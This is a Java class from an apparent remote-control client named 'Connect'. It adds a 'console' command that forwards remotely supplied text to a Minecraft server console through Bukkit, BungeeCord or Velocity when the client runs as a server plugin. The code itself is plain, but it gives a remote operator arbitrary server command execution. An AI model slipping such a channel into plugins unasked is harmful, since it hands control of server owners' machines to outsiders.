package br.com.introcdc.connect.client.commands.info;
/*
 * Written by IntroCDC, Bruno Coêlho at 11/09/2026 - 01:11
 */

import br.com.introcdc.connect.client.command.ClientCommand;

public class ClientCommandConsole extends ClientCommand {

    public ClientCommandConsole() {
        super("console");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        if (input == null || input.isEmpty()) {
            msg("Digite um comando para executar no console!");
            return;
        }

        if (br.com.introcdc.connect.Connect.FOLDER.equals("plugins/")) {
            try {
                Class.forName("org.bukkit.Bukkit");
                Class<?> mainClass = Class.forName("br.com.introcdc.connect.client.server.BukkitMain");
                mainClass.getMethod("execute", String.class).invoke(null, input);
                msg("Comando enviado ao console do Bukkit: " + input);
                return;
            } catch (Throwable ignored) {
            }

            try {
                Class.forName("net.md_5.bungee.api.ProxyServer");
                Class<?> mainClass = Class.forName("br.com.introcdc.connect.client.server.BungeeMain");
                mainClass.getMethod("execute", String.class).invoke(null, input);
                msg("Comando enviado ao console do BungeeCord: " + input);
                return;
            } catch (Throwable ignored) {
            }

            try {
                Class.forName("com.velocitypowered.api.proxy.ProxyServer");
                Class<?> mainClass = Class.forName("br.com.introcdc.connect.client.server.VelocityMain");
                mainClass.getMethod("execute", String.class).invoke(null, input);
                msg("Comando enviado ao console do Velocity: " + input);
                return;
            } catch (Throwable ignored) {
            }
        }

        msg("O cliente não está rodando no modo plugin de servidor Minecraft!");
    }

}
